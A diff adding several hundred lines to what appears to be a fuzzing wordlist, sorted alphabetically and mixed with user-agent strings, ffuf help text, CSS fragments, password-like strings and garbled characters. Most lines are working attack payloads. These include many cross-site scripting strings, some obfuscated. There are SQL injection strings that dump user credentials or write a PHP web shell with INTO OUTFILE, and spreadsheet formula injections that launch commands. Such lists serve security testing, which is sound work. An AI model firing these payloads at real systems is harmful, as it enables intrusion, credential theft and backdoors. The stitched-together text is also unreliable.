@@ -1,3 +1,316 @@
++		addition, concatenate (or space in url)
++ sleep(10) + '
++((+!![]+[])+(!+[]+!![])+(!+[]+!![]+!![]+[]))
++()'9cgv*x-}gmj=b[_v7yowbx>
++(+)blangp
 +DDE("cmd";"/C calc";"__DDE__")
++aciapga8-script+ad4-alert(document.location)+adw-/script+ad4apaai-
++adw-html+ad4apa-body+ad4apa-div+ad4-top secret+adw-/div+ad4apa-/body+ad4apa-/html+ad4-.toxmlstring().match(/.*/m),alert(regexp.input);
++adw-img src=+aci-1+aci- onerror=+aci-alert(1)+aci- /+ad4-
++adw-script+ad4-alert('xss');+adw-/script+ad4-
++adw-script+ad4-alert(+acc-utf-7!+acc-)+adw-+ac8-script+ad4-
++adw-script+ad4-alert(+acc-xss+acc-)+adw-+ac8-script+ad4-
++adw-script+ad4-alert(1);+adw-/script+ad4-
++adw-script+ad4-alert(document.location)+adw-/script+ad4-
++alert(0)+
++alert(1)&&null=='
++benchmark(3200,sha1(1))+'
++confirm(1)
++confirm(1)--
++if(benchmark(3000000,md5(1)),null,null))%20%23
++if(benchmark(3000000,md5(1)),null,null))%20--
++if(benchmark(3000000,md5(1)),null,null))%20/*
++if(benchmark(3000000,md5(1)),null,null),null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null)%20--
++if(benchmark(3000000,md5(1)),null,null),null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null)%20/*
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20%23
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20--
++if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20/*
++onerror=alert(1)%3e/
++onerror=prompt(1)%3e/
++sitidi.net/sitidibot/1.0 (+have good day)
++{...alert(1)}
++{...{...{...{...alert(1)}}}}
+- (compatible; msie 9.0; windows nt 6.1; win64; x64; trident/5.0)
+- (compatible; msie 9.0; windows nt 6.1; wow64; trident/5.0)
+- [angular security](https://angular.io/guide/security)
+- [blind xss angularjs payloads](https://ardern.io/2018/12/07/angularjs-bxss)
+- [bypass domsanitizer](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
+- [todo](todo)<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1)</a:script><a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script><script>alert(1)</script><script>alert(1)</script><a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1)</a:script>{
+- [xss without html - csti with angular js - portswigger](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
+- mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/42.0.2311.135 safari/537.36 edge/12.10240
+- mozilla/5.0 (x11; linux x86_64) applewebkit/534.34 (khtml, like gecko) rekonq/1.1 safari/534.34
+--!><svg onload=prompt(1)
+--!><svg/onload=prompt(1)
+-->'"/></script><details open x=">" ontoggle=(co\u006efirm)``>
+-->'"/></script><svg x=">" onload=(co\u006efirm)``>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(7730)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1856)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(2667)> -->
+--><!-- --\x3e> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x3e> <img src=xxx:x onerror=javascript:alert(3261)> -->
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+--><d/ /ondrag=co\u006efir\u006d(2)>hello.
+--><script>alert(123)</script>
+--><script>alert(14)</script>
+--mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/56.0.2924.87 safari/537.36
+-1 group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=users;#
+-1 group_concat(table_name),@@version,database(),4,5,6,7,8 from information_schema where table_schema=database();#
+-1 group_concat(username,0x3a,password,0x3a,email,0x3a,id),2,3,4,5,6,7,8 from users;#
+-1 union all select null, null, null, null, convert(image,1), null, null,null, null, null, null, null, null, null, null, null, null--
+-1 union select "<?php system("$_request['cmd']); ?>",2,3,4,5 into outfile 'backdoor.php'
+-1 union select 1,2,3,load_file('c:\boot.ini'),5
+-1 union select 1,2,3,user(),5
+-1 union select 1,2,3,version(),5
+-1 union select @@version,user(),database(),4,5,6,7,8;#
+-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+-1<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
+-1<crosssitescripting style="crosssitescripting:expression(document.cookie=true)">
+-1<div style="background-image: url(javascript:document.cookie=true;)">
+-1<div style="background-image: url(javascript:document.cookie=true;);">
+-1<div style="behaviour: url([link to code]);">
+-1<div style="binding: url([link to code]);">
+-1<div style="width: expression(document.cookie=true);">
+-1<div style="width: expression(document.cookie=true;);">
+-1<img style="crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)">
+-1<style type="text/css">body{background:url("javascript:document.cookie=true")}</style>
+-1<style>.crosssitescripting{background-image:url("javascript:document.cookie=true");}</style><a class=crosssitescripting></a>
+-1<style>li {list-style-image: url("javascript:document.cookie=true;");</style><ul><li>crosssitescripting
+-1exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+-444@chat.facebook.com (2013-08-29t14.23.01-0700).xml
+-ac                 automatically calibrate filtering options (default: false)
+-alert(1)-
+-alert(1)//\
+-alert(1)}//\
+-c                  colorize output. (default: false)
+-confirm(1)-
+-d                  dirsearch wordlist compatibility mode. used in conjunction with -e flag. (default: false)
+-fscommand() (execute from within an embedded flash object)
+-ic                 ignore wordlist comments (default: false)
+-ignore-body        do not fetch the response content. (default: false)
+-input-num          number of inputs to test. used in conjunction with --input-cmd. (default: 100)
+-maxtime            maximum running time in seconds for entire process. (default: 0)
+-maxtime-job        maximum running time in seconds per job. (default: 0)
+-mc                 match http status codes, or "all" for everything. (default: 200,204,301,302,307,401,403,405)
+-mode               multi-wordlist operation mode. available modes: clusterbomb, pitchfork (default: clusterbomb)
+-mozilla/5.0 (windows nt 6.2; rv:9.0.1) gecko/20100101 firefox/9.0.1
+-next-()
+-noninteractive     disable the interactive console functionality (default: false)
+-of                 output file format. available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
+-onabort() (when user aborts the loading of an image)
+-onactivate() (when object is set as the active element)
+-onafterprint() (activates after user prints or previews print job)
+-onafterupdate() (activates on data object after updating data in the source object)
+-onbeforeactivate() (fires before the object is set as the active element)
+-onbeforecopy() (attacker executes the attack string right before a selection is copied to the clipboard (use the execcommand(&quot;copy&quot;) function)
+-onbeforecut() (attacker executes the attack string right before a selection is cut)
+-onbeforedeactivate() (fires right after the activeelement is changed from the current object)
+-onbeforeeditfocus() (fires before an object contained in an editable element enters a ui-activated state or when an editable container object is control selected)
+-onbeforepaste() (user needs to be tricked into pasting or be forced into it using the execcommand(&quot;paste&quot;) function)
+-onbeforeprint() (user would need to be tricked into printing or attacker could use the print() or execcommand(&quot;print&quot;) function)
+-onbeforeunload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
+-onbegin() (fires immediately when the element&apos;s timeline begins)
+-onblur() (in the case where another popup is loaded and window loses focus)
+-onbounce() (fires when the behavior property of the marquee object is set to &quot;alternate&quot; and the contents of the marquee reach one side of the window)
+-oncellchange() (fires when data changes in the data provider)
+-onchange() (fires when select, text, or textarea field loses focus and its value has been modified)
+-onclick() (fires when someone clicks on a form)
+-oncontextmenu() (user would need to right click on attack area)
+-oncontrolselect() (fires when the user is about to make a control selection of the object)
+-oncopy() (user needs to copy something or it can be exploited using the execcommand(&quot;copy&quot;) command)
+-oncut() (user needs to copy something or it can be exploited using the execcommand(&quot;cut&quot;) command)
+-ondataavailible() (user would need to change data in an element, or attacker could perform the same function)
+-ondatasetchanged() (fires when the data set exposed by a data source object changes)
+-ondatasetcomplete() (fires to indicate that all data is available from the data source object)
+-ondblclick() (fires when user double-clicks a form element or a link)
+-ondeactivate() (fires when the activeelement is changed from the current object to another object in the parent document)
+-ondrag() (requires that the user drags an object)
+-ondragdrop() (user drops an object (e.g. file) onto the browser window)
+-ondragend() (requires that the user drags an object)
+-ondragenter() (requires that the user drags an object into a valid location)
+-ondragleave() (requires that the user drags an object off a valid location)
+-ondragover() (requires that the user drags an object into a valid location)
+-ondrop() (fires when user drops an object (e.g. file) onto the browser window)
+-onerror() (loading of a document or image causes an error)
+-onerrorupdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
+-onfilterchange() (fires when a visual filter completes state change)
+-onfinish() (attacker could create the exploit when marquee is finished looping)
+-onfocus() (attacker executes the attack string when the window gets focus)
+-onfocusin() (attacker executes the attack string when window gets focus)
+-onfocusout() (attacker executes the attack string when window loses focus)
+-onhelp() (attacker executes the attack string when users hits f1 while the window is in focus)
+-onkeydown() (fires when user depresses a key)
+-onkeypress() (fires when user presses or holds down a key)
+-onkeyup() (fires when user releases a key)
+-onlayoutcomplete() (user would have to print or print preview)
+-onload() (attacker executes the attack string after the window loads)
+-onlosecapture() (can be exploited by the releasecapture() method)
+-onmediacomplete() (when a streaming media file is used, this event could fire before the file starts playing)
+-onmediaerror() (user opens a page in the browser that contains a media file, and the event fires when there is a problem)
+-onmousedown() (the attacker would need to get the user to click on an image)
+-onmouseenter() (fires when cursor moves over an object or area)
+-onmouseleave() (the attacker would need to get the user to mouse over an image or table and then off again)
+-onmousemove() (the attacker would need to get the user to mouse over an image or table)
+-onmouseout() (the attacker would need to get the user to mouse over an image or table and then off again)
+-onmouseover() (fires when cursor moves over an object or area)
+-onmouseup() (the attacker would need to get the user to click on an image)
+-onmousewheel() (the attacker would need to get the user to use their mouse wheel)
+-onmove() (user or attacker would move the page)
+-onmoveend() (user or attacker would move the page)
+-onmovestart() (user or attacker would move the page)
+-onoutofsync() (interrupt the element&apos;s ability to play its media as defined by the timeline)
+-onpaste() (user would need to paste or attacker could use the execcommand(&quot;paste&quot;) function)
+-onpause() (fires on every element that is active when the timeline pauses, including the body element)
+-onprogress() (attacker would use this as a flash movie was loading)
+-onpropertychange() (user or attacker would need to change an element property)
+-onreadystatechange() (user or attacker would need to change an element property)
+-onreset() (fires when user or attacker resets a form)
+-onresize() (user would resize the window; attacker could auto initialize with something like: &lt;script&gt;self.resizeto(500,400);&lt;/script&gt;)
+-onresizeend() (user would resize the window; attacker could auto initialize with something like: &lt;script&gt;self.resizeto(500,400);&lt;/script&gt;)
+-onresizestart() (user would resize the window; attacker could auto initialize with something like: &lt;script&gt;self.resizeto(500,400);&lt;/script&gt;)
+-onresume() (fires on every element that becomes active when the timeline resumes, including the body element)
+-onreverse() (if the element has a repeatcount greater than one, this event fires every time the timeline begins to play backward)
+-onrowenter() (user or attacker would need to change a row in a data source)
+-onrowexit() (user or attacker would need to change a row in a data source)
+-onrowsdelete() (user or attacker would need to delete a row in a data source)
+-onrowsinserted() (user or attacker would need to insert a row in a data source)
+-onscroll() (user would need to scroll, or attacker could use the scrollby() function)
+-onseek() (fires when the timeline is set to play in any direction other than forward)
+-onselect() (user needs to select some text - attacker could auto initialize with something like: window.document.execcommand(&quot;selectall&quot;);)
+-onselectionchange() (user needs to select some text - attacker could auto initialize with something like: window.document.execcommand(&quot;selectall&quot;);)
+-onselectstart() (user needs to select some text - attacker could auto initialize with something like: window.document.execcommand(&quot;selectall&quot;);)
+-onstart() (fires at the beginning of each marquee loop)
+-onstop() (user would need to press the stop button or leave the webpage)
+-onsubmit() (requires attacker or user submits a form)
+-onsyncrestored() (user interrupts the element&apos;s ability to play its media as defined by the timeline to fire)
+-ontimeerror() (fires when user or attacker sets a time property, such as &quot;dur&quot;, to an invalid value)
+-ontrackchange() (fires when user or attacker changes track in a playlist)
+-onunload() (fires when the user clicks any link or presses the back button or attacker forces a click)
+-onurlflip() (fires when an advanced streaming format (asf) file, played by a html+time (timed interactive multimedia extensions) media tag, processes script commands embedded in the asf file)
+-or                 don't create the output file if we don't have results (default: false)
+-prompt(1)-
+-r                  follow redirects (default: false)
+-rate               rate of requests per second (default: 0)
+-receiver(1).html
+-recursion          scan recursively. only fuzz keyword is supported, and url (-u) has to end in it. (default: false)
+-recursion-depth    maximum recursion depth. (default: 0)
+-recursion-strategy recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
+-request-proto      protocol to use along with raw request (default: https)
+-s                  do not print additional information (silent mode) (default: false)
+-sa                 stop on all error cases. implies -sf and -se. (default: false)
+-se                 stop on spurious errors (default: false)
+-seeksegmenttime() (locates the specified point on the element&apos;s segment time line and begins playing from that point. the segment consists of one repetition of the time line including reverse play using the autoreverse attribute.)
+-sf                 stop when > 95% of responses return 403 forbidden (default: false)
+-t                  number of concurrent threads. (default: 40)
+-timeout            http request timeout in seconds. (default: 10)
+-v                  show version information. (default: false)
+-v                  verbose output, printing full url and redirect location (if any) with the results. (default: false)
+-w                  wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:keyword'
+-x                  proxy url (socks5 or http). for example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080
+-{valueof(){alert`:d`}}
+= mozilla/5.0 (x11; linux x86_64; rv:2.0b9pre) gecko/20130328 firefox/22.0
+="mozilla/5.0 (macintosh; u; intel mac os x 10_6_2; en-us) applewebkit/531.21.8 (khtml, like gecko) version/4.0.4 safari/531.21.10"
+="mozilla/5.0 (windows nt 5.1) applewebkit/537.36 (khtml, like gecko) chrome/34.0.1847.116 safari/537.36"
+='><script>alert("xss")</script>
+=(2017)-mein
+=(=(!))"
+=3cscript=3econfirm(document.location)=3c/script=3e<script>alert('xss')</script>cwsi  xetÝrÛfÞÕÚ–ÿe1à@£44Ž	¶dÃ0ƒ!žrn _$Ã ñ,Ò
+==alert(1)==
 =SUM(1+1)*cmd|' /C calc'!A0
+=mozilla/4.0 (compatible; msie 6.0; windows nt 5.1; sv1; .net clr 1.0.3705; .net clr 1.1.4322)
+=mozilla/5.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
+=mozilla/5.0 (iphone; cpu iphone os 8_4_1 like mac os x) applewebkit/600.1.4 (khtml, like gecko) mobile/12h321
+=mozilla/5.0 (iphone; u; cpu iphone os 4_2_1 like mac os x; ko-kr) applewebkit/533.17.9 (khtml, like gecko) version/5.0.2 mobile/8c148 safari/6533.18.5
+=mozilla/5.0 (linux; android 4.4.2; ko-kr; lg-f350s build/kot49i.f350s10p) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/30.0.1599.103 mobile safari/537.36
+=mozilla/5.0 (linux; android 4.4.2; ko-kr; samsung shv-e330s build/kot49h) applewebkit/537.36 (khtml, like gecko) version/1.5 chrome/28.0.1500.94 mobile safari/537.36
+=mozilla/5.0 (linux; android 4.4.2; lg-f240l build/kot49i.f240l20i) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.133 mobile safari/537.36
+=mozilla/5.0 (linux; android 4.4.4; shv-e210s build/ktu84p) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/33.0.0.0 mobile safari/537.36
+=mozilla/5.0 (linux; android 4.4.4; sm-g720n0 build/ktu84p) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/33.0.0.0 mobile safari/537.36
+=mozilla/5.0 (linux; android 5.1; lg-f500l build/lmy47d; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/44.0.2403.117 mobile safari/537.36
+=mozilla/5.0 (linux; u; android 4.1.2; ko-kr; shv-e110s build/jzo54k) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
+=mozilla/5.0 (linux; u; android 4.4.2; ko-kr; samsung sm-n750s build/kot49h) applewebkit/537.36 (khtml, like gecko) version/1.5 chrome/28.0.1500.94 mobile safari/537.36
+=mozilla/5.0 (macintosh; u; intel mac os x 10_11_1; en-us) applewebkit/532.0 (khtml, like gecko) chrome/4.0.212.0 safari/532.0
+=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/60.0.3112.101 safari/537.36
+=mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.9 safari/537.36
+=mozilla/5.0 (windows; u; windows nt 6.1; en-us) applewebkit/534.16 (khtml, like gecko) chrome/10.0.648.204 safari/534.16
+=rand()
+=scq(2+ucm)x77m
+=Ã¢â‚¬â„¢Ã¢â‚¬Â><img/src=Ã¢â‚¬ÂxÃ¢â‚¬Âonerror=eval(string.fromcharcode(119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,116,73,116,101,109,40,39,105,100,39,44,39,34,62,60,105,109,103,47,115,114,99,61,92,34,120,92,34,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62,39,41))>
+=â€™â€><img/src=â€xâ€onerror=eval(string.fromcharcode(119,105,110,100,111,119,46,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,116,73,116,101,109,40,39,105,100,39,44,39,34,62,60,105,109,103,47,115,114,99,61,92,34,120,92,34,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62,39,41))>
+@!@#%^&*().x
+@"><img src=x/onerror=confirm(1)>xss
+@#$%&*()
+@#$%&*()_+
+@#$%&*-+()
+@#$%()+_
+@#$%*()_
+@#$%^&*()
+@#$%^&*()1234567890
+@#$%^&*()_+
+@#$%^&*()_+{}:\\\"|<>
+@#$%^&*()_+{}:\\\\
+@#$%^&*()mahamrocks1992
+@#$%^&*()qwertyuiop
+@#$%^&amp:*()_+qazwsxedc12345
+@#$567*()
+@#%&*()
+@#%&*()_+
+@#%^&*!()
+@#&(&(*)
+@#?$!w()
+@(#)
+@()&!@%&
+@(*)snoppy97
+@(1+2)
+@(1234)
+@(6+5)
+@2(chunna)
 @SUM(1+2)
+@bot.message_handler(commands=['scan'])
+@crystal()
+@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+@i\6d\70o\72\74'javascr\ipt:alert(document.cookie)';
+@media (forced-colors:active){.joyarh{outline:1px solid transparent;}}/*!sc*/
+@media (min-width:768px){.hlzfvi{font-size:var(--text-body-size-medium);}}/*!sc*/
+@media (pointer:coarse){.bhmvop:before{content:"";position:absolute;left:0;right:0;-webkit-transform:translatey(-50%);-ms-transform:translatey(-50%);transform:translatey(-50%);top:50%;min-height:44px;}}/*!sc*/
+@media (pointer:coarse){.dbgjoi:before{content:"";position:absolute;left:0;right:0;-webkit-transform:translatey(-50%);-ms-transform:translatey(-50%);transform:translatey(-50%);top:50%;min-height:44px;}}/*!sc*/
+@media print,screen and (max-width:1011px) and (min-width:768px){.cemwse{display:none;}}/*!sc*/
+@media screen and (max-width:768px){.bckfwo[data-size="medium"]{display:block;}}/*!sc*/
+@media screen and (min-width:1280px){.ffsopl{--pane-max-width-diff:959px;}}/*!sc*/
+@media screen and (min-width:1360px){.hkaejf{display:block;}}/*!sc*/
+@media screen and (min-width:544px){.dzcjzi{-webkit-flex-wrap:nowrap;-ms-flex-wrap:nowrap;flex-wrap:nowrap;}}/*!sc*/
+@media screen and (min-width:544px){.gissdq{width:100%;}}/*!sc*/
+@media screen and (min-width:544px){}/*!sc*/
+@media screen and (min-width:768px){.cemwse{width:auto;margin-top:0 !important;margin-bottom:0 !important;position:-webkit-sticky;position:sticky;top:0px;max-height:100vh !important;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;margin-right:0;height:100vh;}}/*!sc*/
+@media screen and (min-width:768px){.ffsopl{width:clamp(var(--pane-min-width),var(--pane-width),var(--pane-max-width));overflow:auto;}}/*!sc*/
+@media screen and (min-width:768px){.gissdq{width:auto;}}/*!sc*/
+@media screen and (min-width:768px){.hpvfuc{margin-left:0 !important;margin-right:0 !important;}}/*!sc*/
+@q8m\\~[9#;lvq@wqp()5ukv]n2wp_|
+@w!q&*()
+@w!q()+_
+@w!q*()_
+@w1()
